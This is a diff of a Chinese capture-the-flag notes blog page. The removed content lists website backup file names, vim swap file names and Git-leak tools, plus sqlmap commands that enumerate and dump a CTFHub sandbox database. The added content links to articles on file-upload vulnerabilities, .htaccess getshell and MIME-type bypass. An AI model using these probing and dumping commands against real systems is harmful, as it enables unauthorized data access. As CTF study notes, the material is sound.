@@ -19,16 +19,16 @@
   <meta name="author" content="suny">
   <meta name="keywords" content="">
   
-    <meta name="description" content="CTFHub备份文件下载网页源码常见的网站源码备份文件后缀    tar    tar.gz    zip    rar常见的网站源码备份文件名    web    website    backup    back    www    wwwroot    temp vim缓存vim异常退出后，会存储临时文件，如下三种如编辑 index.php第一次产生意外退出 保存为 .index.php.s">
+    <meta name="description" content="文件上传漏洞文件上传漏洞（全网最详细） 文件上传之 .htaccess文件getshell 文件上传漏洞之MIME type验证原理和绕过">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CTF零碎题目">
 <meta property="og:url" content="https://www.sunynov.top/2025/11/08/CTF%E6%9D%82%E8%AE%B0/index.html">
 <meta property="og:site_name" content="suny">
-<meta property="og:description" content="CTFHub备份文件下载网页源码常见的网站源码备份文件后缀    tar    tar.gz    zip    rar常见的网站源码备份文件名    web    website    backup    back    www    wwwroot    temp vim缓存vim异常退出后，会存储临时文件，如下三种如编辑 index.php第一次产生意外退出 保存为 .index.php.s">
+<meta property="og:description" content="文件上传漏洞文件上传漏洞（全网最详细） 文件上传之 .htaccess文件getshell 文件上传漏洞之MIME type验证原理和绕过">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://pic1.imgdb.cn/item/690c233e3203f7be00db6444.png">
 <meta property="article:published_time" content="2025-11-08T13:59:32.000Z">
-<meta property="article:modified_time" content="2025-11-26T09:45:17.768Z">
+<meta property="article:modified_time" content="2025-11-30T03:14:21.351Z">
 <meta property="article:author" content="suny">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://pic1.imgdb.cn/item/690c233e3203f7be00db6444.png">
@@ -252,7 +252,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          191 字
+          39 字
         
       </span>
     
@@ -263,7 +263,7 @@
         
         
         
-          2 分钟
+          1 分钟
         
       </span>
     
@@ -305,7 +305,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年11月26日 下午
+                    本文最后更新于 2025年11月30日 上午
                   
                 
               </p>
@@ -313,13 +313,10 @@
             
               <div class="markdown-body">
                 
-                <h1 id="CTFHub"><a href="#CTFHub" class="headerlink" title="CTFHub"></a>CTFHub</h1><h3 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h3><h4 id="网页源码"><a href="#网页源码" class="headerlink" title="网页源码"></a>网页源码</h4><p>常见的网站源码备份文件后缀<br>    tar<br>    tar.gz<br>    zip<br>    rar<br>常见的网站源码备份文件名<br>    web<br>    website<br>    backup<br>    back<br>    www<br>    wwwroot<br>    temp</p>
-<h4 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h4><p>vim异常退出后，会存储临时文件，如下三种<br>如编辑 index.php<br>第一次产生意外退出 保存为 .index.php.swp<br>第二次产生意外退出 保存为 .index.php.swo<br>第三次产生意外退出 保存为 .index.php.swn</p>
-<h3 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h3><p>主要用到GitHack,Git_Extract</p>
-<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><h3 id="SQLmap的使用"><a href="#SQLmap的使用" class="headerlink" title="SQLmap的使用"></a>SQLmap的使用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 --current-db<br><br>python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables<br><br>python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --columns<br><br>python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag -C flag --dump<br></code></pre></td></tr></table></figure>
+                <h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_59598029/article/details/138793923">文件上传漏洞（全网最详细）</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46684578/article/details/119141109">文件上传之 .htaccess文件getshell</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lza20001103/article/details/124427171">文件上传漏洞之MIME type验证原理和绕过</a></p>
 
-<p>依次为查询最近使用的数据库，查询表，查询字段，转存数据</p>
-<h1 id="CTFshow"><a href="#CTFshow" class="headerlink" title="CTFshow"></a>CTFshow</h1>
                 
               </div>
             
